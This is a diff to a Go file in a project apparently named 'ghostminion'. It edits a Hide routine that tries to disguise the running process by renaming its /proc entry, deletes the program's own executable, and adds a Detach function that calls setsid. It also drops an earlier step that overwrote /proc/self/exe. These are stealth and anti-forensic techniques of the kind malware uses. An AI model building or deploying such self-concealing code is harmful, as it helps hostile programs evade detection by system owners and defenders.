@@ -4,6 +4,7 @@ import (
 	"ghostminion/logger"
 	"os"
 	"strconv"
+	"golang.org/x/sys/unix"
 )
 
 var lgr = logger.GetLogger()
@@ -14,10 +15,6 @@ func Hide() {
 	if err != nil {
 		lgr.Error("Error hiding process:", err.Error())
 	}
-	err = overwriteExecutable()
-	if err != nil {
-		lgr.Error("Error overwriting executable:", err.Error())
-	}
 	err = deleteSelf()
 	if err != nil {
 		lgr.Error("Error deleting self:", err.Error())
@@ -25,6 +22,7 @@ func Hide() {
 }
 
 func hideProcess() error {
+	// needs more research (probably won't work if you are not root?)
 	pid := os.Getpid()
 	newName := "/tmp/." + strconv.Itoa(pid)
 	oldPath := "/proc/" + strconv.Itoa(pid)
@@ -34,34 +32,15 @@ func hideProcess() error {
 	return nil
 }
 
-func overwriteExecutable() error {
-	f, err := os.OpenFile("/proc/self/exe", os.O_WRONLY, 0)
-	if err != nil {
+func deleteSelf() error {
+	if exe, err := os.Executable(); err != nil {
 		return err
-	}
-	defer func(f *os.File) {
-		err := f.Close()
-		if err != nil {
-
-		}
-	}(f)
-
-	_, err = f.Write([]byte(" "))
-	if err != nil {
+	} else if err = os.Remove(exe); err != nil {
 		return err
 	}
 	return nil
 }
 
-func deleteSelf() error {
-	exe, err := os.Executable()
-	if err != nil {
-		return err
-	}
-
-	err = os.Remove(exe)
-	if err != nil {
-		return err
-	}
-	return nil
+func Detach() {
+	_, _ = unix.Setsid()
 }
